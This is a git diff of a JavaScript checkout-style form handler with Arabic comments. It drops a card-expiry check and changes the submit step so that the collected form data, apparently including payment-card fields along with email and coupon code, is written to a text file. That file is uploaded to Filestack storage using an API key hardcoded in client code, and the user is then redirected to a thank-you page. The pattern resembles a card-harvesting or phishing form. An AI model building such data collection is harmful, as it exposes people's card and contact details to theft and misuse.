@@ -171,19 +171,31 @@ document.addEventListener('DOMContentLoaded', function () {
       fileContent += `Coupon Code: ${couponCode}\n`;
 
       // رفع الملف إلى Filestack
-      uploadFileToFilestack(fileContent); 
+      uploadFileToFilestack(fileContent, email, couponCode); 
 
     }
   });
 
-  function isCardExpired(expiry) {
-    const [month, year] = expiry.split('/');  // تقسيم التاريخ إلى الشهر والسنة
-    const expiryDate = new Date(`20${year}`, month - 1);  // إنشاء تاريخ انتهاء البطاقة
+  // دالة لرفع الملف إلى Filestack
+  let orderNumber = 1;  // تعيين رقم تسلسلي للطلب
+  function uploadFileToFilestack(fileContent, email, couponCode) {
+    // توليد اسم الملف بناءً على رمز القسيمة ورقم الطلب والبريد الإلكتروني
+    const fileName = `${couponCode}_order${orderNumber}_${email}.txt`;
 
-    const currentDate = new Date();  // التاريخ الحالي
-    currentDate.setHours(0, 0, 0, 0);  // إزالة الوقت من التاريخ الحالي
+    // زيادة رقم الطلب للطلب التالي
+    orderNumber++;
 
-    return expiryDate < currentDate;  // إذا كان تاريخ الانتهاء في الماضي
+    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
+    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
+    client.upload(fileBlob, { filename: fileName })
+      .then((res) => {
+        console.log('File uploaded successfully:', res);
+        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
+        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
+      })
+      .catch((err) => {
+        console.error('Error uploading file:', err);
+      });
   }
 
   // دالة للتحقق من البريد الإلكتروني
@@ -244,21 +256,6 @@ document.addEventListener('DOMContentLoaded', function () {
     errorMessages.forEach(function(message) {
       message.remove();
     });
-  }
-
-  // دالة لرفع الملف إلى Filestack
-  function uploadFileToFilestack(fileContent) {
-    const client = filestack.init('A7fSrsBg3RjybN1kkK99lz');  // استبدل بـ API Key الخاص بك
-    const fileBlob = new Blob([fileContent], { type: 'text/plain' });
-    client.upload(fileBlob)
-      .then((res) => {
-        console.log('File uploaded successfully:', res);
-        // إعادة توجيه المستخدم إلى صفحة "شكرًا"
-        window.location.href = 'thank-you.html';  // قم بتغيير الرابط إلى صفحة "شكراً" الخاصة بك
-      })
-      .catch((err) => {
-        console.error('Error uploading file:', err);
-      });
   }
 
   // إضافة حدث لملء تاريخ الصلاحية تلقائيًا بـ "/"
